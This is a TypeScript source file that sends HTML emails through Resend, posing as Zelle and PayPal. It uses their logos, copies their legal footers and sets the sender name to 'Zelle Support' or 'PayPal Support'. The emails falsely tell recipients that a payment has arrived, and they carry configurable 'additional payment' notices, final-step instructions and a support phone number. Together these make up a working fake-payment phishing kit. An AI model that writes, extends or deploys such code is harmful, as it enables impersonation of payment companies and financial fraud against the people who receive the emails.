import { ZelleEmailContent, PaypalEmailContent, ZelleAdditionalPaymentContent } from '@/types/email';
import { Resend } from "resend";

const resend = new Resend(process.env.RESEND_API_KEY);

const domain = process.env.NEXT_PUBLIC_APP_URL;

const zelleAdditionalTemplate = (content: string) => `
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zelle Support</title>
    <style>
      body { 
        font-family: Arial, sans-serif; 
        line-height: 1.6; 
        color: #333; 
        margin: 0; 
        padding: 0;
      }
      .container { 
        max-width: 600px; 
        margin: 0 auto; 
        padding: 20px;
        background-color: #ffffff;
      }
      .header { 
        background-color: #6D1ED4; 
        padding: 20px; 
        text-align: center;
      }
      .logo {
        height: 32px;
        width: auto;
      }
      .social-links {
        display: flex;
        justify-content: center;
        gap: 24px;
        margin-top: 32px;
        padding: 16px 0;
        border-top: 1px solid #e5e7eb;
      }
      .social-icon {
        width: 24px;
        height: 24px;
      }
      .footer-text {
        text-align: center;
        color: #6b7280;
        font-size: 14px;
        margin-top: 24px;
      }
      .footer-text p {
        margin: 12px 0;
      }
      .footer-text .disclaimer {
        font-size: 12px;
      }
      .privacy-link {
        color: #6D1ED4;
        text-decoration: none;
      }
      .privacy-link:hover {
        text-decoration: underline;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="header">
        <img src="https://www.zellepay.com/sites/default/files/Zelle-logo-tagline-horizontal-white-v2_1_0.png" alt="Zelle" class="logo">
      </div>

      ${content}

      <div class="social-links">
        <a href="https://twitter.com/zelle" style="color: #1DA1F2;">
          <svg class="social-icon" fill="currentColor" viewBox="0 0 24 24">
            <path d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.072 4.072 0 012.8 9.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 012 18.407a11.616 11.616 0 006.29 1.84"/>
          </svg>
        </a>
        <a href="https://facebook.com/zellepay" style="color: #4267B2;">
          <svg class="social-icon" fill="currentColor" viewBox="0 0 24 24">
            <path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/>
          </svg>
        </a>
        <a href="https://www.instagram.com/zellepay/" style="color: #E4405F;">
          <svg class="social-icon" fill="currentColor" viewBox="0 0 448 512">
            <path d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/>
          </svg>
        </a>
        <a href="https://www.youtube.com/c/ZellePay" style="color: #FF0000;">
          <svg class="social-icon" fill="currentColor" viewBox="0 0 24 24">
            <path d="M23.498 6.186a3.016 3.016 0 00-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 00.502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 002.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 002.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/>
          </svg>
        </a>
      </div>

      <div class="footer-text">
        <p>
          <a href="https://www.zellepay.com/privacy-policy" class="privacy-link">
            Do Not Sell or Share My Personal Information*
          </a>
        </p>
        <p class="disclaimer">
          *We don't sell data. However, we do share data for cross context behavioral advertising. 
          You can opt out by clicking the link above.
        </p>
        <p class="disclaimer" style="margin-top: 16px;">
          2025 Early Warning Services, LLC. All rights reserved. Zelle and the Zelle marks used herein are trademarks 
          of Early Warning Services, LLC. Other product and company names mentioned herein are the property of their 
          respective owners.
        </p>
      </div>
    </div>
  </body>
  </html>
`;

export async function sendZelle(email: string, content: ZelleEmailContent | ZelleAdditionalPaymentContent) {
  try {
    let htmlContent;
    
    if ('visibleBlocks' in content) {
      // This is an additional payment email
      htmlContent = `
        <div style="text-align: center;">
          ${content.visibleBlocks.amountNotification ? `
            <h2 style="color: #333; font-size: 20px; margin-bottom: 20px;">
              ${content.amountNotificationText || `You have successfully received an additional payment of $${content.recipientAmount}`}
            </h2>
          ` : ''}
          
          ${content.visibleBlocks.status ? `
            <div style="background-color: #6D1ED4; color: white; padding: 15px; margin: 20px 0; border-radius: 5px;">
              ${content.statusText}
            </div>
          ` : ''}

          ${content.visibleBlocks.instructions ? `
            <div style="background-color: #f3f4f6; padding: 20px; border-radius: 8px; margin-bottom: 24px;">
              <div style="text-align: left;">
                <h3 style="font-family: Averta,Avenir,Helvetica,Arial,sans-serif; font-size: 24px; color: #6D1ED4; margin-bottom: 16px; font-weight: 600; text-align: center;">
                  ${content.instructionsTitle || 'FINAL STEPS & INSTRUCTIONS TO FOLLOW'}
                </h3>
                <div style="font-size: 16px; line-height: 1.5; white-space: pre-wrap; color: #4a5568;">
                  ${content.instructionsBlock}
                </div>
              </div>
            </div>
          ` : ''}
          
          <div style="text-align: left;">
            ${content.visibleBlocks.message ? `
              <div style="color: #4a5568; margin: 20px 0;">
                ${content.message}
              </div>
            ` : ''}
            
            ${content.visibleBlocks.importantNotes ? `
              <div style="border-top: 1px solid #e5e7eb; padding-top: 20px; margin-top: 20px;">
                <p style="color: #6D1ED4; font-weight: 500; margin-bottom: 16px;">
                  ${content.importantNotesBlock}
                </p>
              </div>
            ` : ''}

            ${content.visibleBlocks.finalInstructions ? `
              <div style="border-top: 1px solid #e5e7eb; border-bottom: 1px solid #e5e7eb; padding: 20px 0; margin: 20px 0;">
                <p style="font-weight: bold; color: #4a5568;">
                  ${content.finalInstructionsBlock}
                </p>
              </div>
            ` : ''}
            
            ${content.visibleBlocks.support ? `
              <p style="color: #6D1ED4; font-weight: 500; margin-top: 20px;">
                ${content.supportText} 
                <a href="tel:${content.supportNumber.replace(/\D/g, '')}" style="color: #6D1ED4; text-decoration: none;">
                  ${content.supportNumber}
                </a>
              </p>
            ` : ''}
          </div>
        </div>
      `;
    } else {
      // This is a standard Zelle email
      htmlContent = `
        <div style="text-align: center;">
          <h2 style="color: #333; font-size: 20px; margin-bottom: 20px;">
            You have received $${content.recipientAmount} from ${content.senderName}
          </h2>
          
          <div style="background-color: #6D1ED4; color: white; padding: 15px; margin: 20px 0; border-radius: 5px;">
            ${content.statusText}
          </div>
          
          <div style="color: #666; margin: 20px 0; text-align: left;">
            ${content.message.split('\n').map(line => 
              `<p style="margin: 0 0 10px 0;">${line}</p>`
            ).join('')}
            
            <p style="color: #6D1ED4; font-weight: 500; margin-top: 16px;">
              ${content.supportText} 
              <a href="tel:${content.supportNumber.replace(/\D/g, '')}" style="color: #6D1ED4; text-decoration: none;">
                ${content.supportNumber}
              </a>
            </p>
          </div>
        </div>
      `;
    }

    // Format the from email with proper Zelle Support name
    const emailPart = content.fromEmail.match(/<(.+)>/) ? content.fromEmail : `<${content.fromEmail}>`;
    const from = `Zelle Support ${emailPart}`;

    const result = await resend.emails.send({
      from,
      to: email,
      subject: content.emailTitle || "Zelle Support",
      html: zelleAdditionalTemplate(htmlContent),
    });

    return { success: true, data: result };
  } catch (error) {
    console.error("Error sending email:", error);
    return { 
      success: false, 
      error: error instanceof Error ? error.message : "Failed to send Zelle email" 
    };
  }
}

export async function sendPaypal(email: string, content: PaypalEmailContent) {
  const emailContent = `
    <div style="max-width: 640px; margin: 0 auto; background-color: #FAF8F5;">
      <!-- Header with Logo and Greeting -->
      <div style="background-color: #FAF8F5; padding: 16px 32px;">
        <p style="color: #687173; font-weight: 500; font-size: 14px; margin: 0 0 16px 0;">
          Hello, ${content.recipientName}
        </p>
        <img 
          src="https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/paypal-rebranding/pp-logo-in-circle-2x.png"
          alt="PayPal"
          style="width: 63px; height: 63px;"
        />
      </div>

      <!-- Main Content -->
      <div style="padding: 0 32px 32px 32px;">
        <h1 style="font-size: 32px; font-weight: 500; line-height: 38px; color: #001c64; margin: 24px 0;">
          ${content.title}
        </h1>
        
        <div style="font-size: 14px; color: #2c2e2f;">
          <div style="background-color: #0070BA; color: white; padding: 16px; border-radius: 8px; text-align: center; font-size: 18px; font-weight: 500; margin-bottom: 24px;">
            You have received $${content.amount} from ${content.senderName}
          </div>
          
          <div style="background-color: #F5F7FA; padding: 16px; border-radius: 8px; text-align: center; font-weight: 500; margin-bottom: 24px;">
            Status: ${content.status}
          </div>

          <div style="margin-bottom: 24px;">
            ${content.message.split('\n').map(paragraph => 
              `<p style="margin-bottom: 16px;">${paragraph}</p>`
            ).join('')}
          </div>
          
          <div style="border-top: 1px solid #e5e7eb; padding-top: 16px;">
            <p style="color: #0070BA; font-weight: 500; margin: 0;">
              ${content.supportText} 
              <a href="tel:${content.supportNumber.replace(/\D/g, '')}" style="color: #0070BA; text-decoration: none;">
                ${content.supportNumber}
              </a>
            </p>
          </div>
        </div>
      </div>

      <!-- Footer -->
      <div style="border-top: 1px solid #e5e7eb;">
        <div style="padding: 16px;">
          <img 
            src="https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/paypal-rebranding/footer-logo-with-crop-2x.png"
            alt="PayPal"
            style="width: 283px; height: 100px;"
          />
        </div>

        <!-- Footer Links -->
        <div style="padding: 8px 32px; font-size: 12px; font-weight: 500;">
          <div style="color: #0070e0;">
            <a href="#" style="color: #0070e0; text-decoration: none;">Help & Contact</a>
            <span style="color: #9ca3af; margin: 0 8px;">|</span>
            <a href="#" style="color: #0070e0; text-decoration: none;">Security</a>
            <span style="color: #9ca3af; margin: 0 8px;">|</span>
            <a href="#" style="color: #0070e0; text-decoration: none;">Apps</a>
          </div>
        </div>

        <!-- Footer Text -->
        <div style="padding: 16px 32px; font-size: 12px; color: #2c2e2f;">
          <p style="margin-bottom: 16px;">
            PayPal is committed to preventing fraudulent emails. Emails from PayPal will always contain your full name. 
            <a href="#" style="color: #0070e0; text-decoration: none; margin-left: 4px;">
              Learn to identify phishing
            </a>
          </p>
          <p style="margin-bottom: 16px;">
            Please don't reply to this email. To get in touch with us, click 
            <a href="#" style="color: #0070e0; text-decoration: none; margin-left: 4px;">
              Help & Contact
            </a>.
          </p>
          <p style="margin-bottom: 16px;">
            Copyright 1999-${new Date().getFullYear()} PayPal. All rights reserved.
          </p>
          <p style="margin: 0;">
            PayPal Pte. Ltd. is licensed by the Monetary Authority of Singapore as a Major Payment Institution under the Payment Services Act 2019.
          </p>
        </div>
      </div>
    </div>
  `;

  try {
    // Format the from email with proper PayPal Support name
    const emailPart = content.fromEmail.match(/<(.+)>/) ? content.fromEmail : `<${content.fromEmail}>`;
    const from = `PayPal Support ${emailPart}`;

    const data = await resend.emails.send({
      from,
      to: [content.toEmail],
      subject: content.title || "PayPal Support", 
      html: zelleAdditionalTemplate(emailContent),
    });

    return { success: true, data };
  } catch (error) {
    console.error('Error sending PayPal email:', error);
    return { 
      success: false, 
      error: error instanceof Error ? error.message : "Failed to send PayPal email" 
    };
  }
}